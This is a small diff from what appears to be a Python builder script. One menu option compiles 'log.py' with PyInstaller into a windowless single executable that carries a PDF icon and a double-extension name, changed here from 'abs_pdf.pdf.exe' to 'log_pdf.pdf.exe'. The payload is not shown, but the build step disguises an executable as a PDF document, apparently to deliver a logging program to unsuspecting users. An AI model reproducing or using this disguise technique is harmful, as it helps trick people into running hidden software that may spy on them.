@@ -93,7 +93,7 @@ elif choice == '4':
     sys.exit()
 
 elif choice == '5':
-    name = 'abs_pdf.pdf.exe'
+    name = 'log_pdf.pdf.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/pdf.ver -i Icons/pdf.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
